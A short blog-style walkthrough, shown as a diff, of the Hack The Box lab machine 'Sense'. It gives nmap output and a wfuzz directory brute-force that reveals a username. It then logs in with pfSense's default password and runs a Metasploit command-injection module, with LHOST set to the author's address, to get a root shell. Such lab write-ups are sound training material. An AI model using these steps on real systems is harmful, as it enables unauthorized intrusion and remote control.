@@ -1,0 +1,33 @@
+I"<p>Sense was another box that you can smash out in 10 minutes you might have spare. Not much to be learnt from this one as it was very straight forward.</p>
+
+<h1 id="nmap-scan">Nmap scan</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT STATE SERVICE VERSION
+80/tcp open http lighttpd 1.4.35
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Did not follow redirect to https://10.10.10.60/
+443/tcp open ssl/https?
+|_ssl-date: TLS randomness does not represent time
+</code></pre></div></div>
+<p>Navigating to the webserver we get shown a pfsense login page and not much else.</p>
+
+<h1 id="wfuzz-results">Wfuzz results</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc 404,301 https://10.10.10.60/FUZZ.txt
+001197: C=200 9 L 40 W 271 Ch "changelog"
+112347: C=200 6 L 12 W 106 Ch "system-users"
+</code></pre></div></div>
+<p>Changelog indicates the current version is vulnerable to something. system-users indicates the username ‘rohit’ and ‘company-default’ exist. Trying the username rohit and pfsense default password of ‘pfsense’ lets us in.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+<p>Searching for an exploit with this platform returns a metasploit module that fits our needs, filling in the details we know we can run the exploit.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(unix/http/pfsense_graph_injection_exec) &gt; set RHOST 10.10.10.60
+RHOST =&gt; 10.10.10.60
+msf exploit(unix/http/pfsense_graph_injection_exec) &gt; set USERNAME rohit
+USERNAME =&gt; rohit
+msf exploit(unix/http/pfsense_graph_injection_exec) &gt; set LHOST tun0
+LHOST =&gt; 10.10.14.6
+msf exploit(unix/http/pfsense_graph_injection_exec) &gt; exploit
+</code></pre></div></div>
+<p><br />
+The above exploit yields a root level shell so theres no need to extend privileges.</p>
+
+:ET
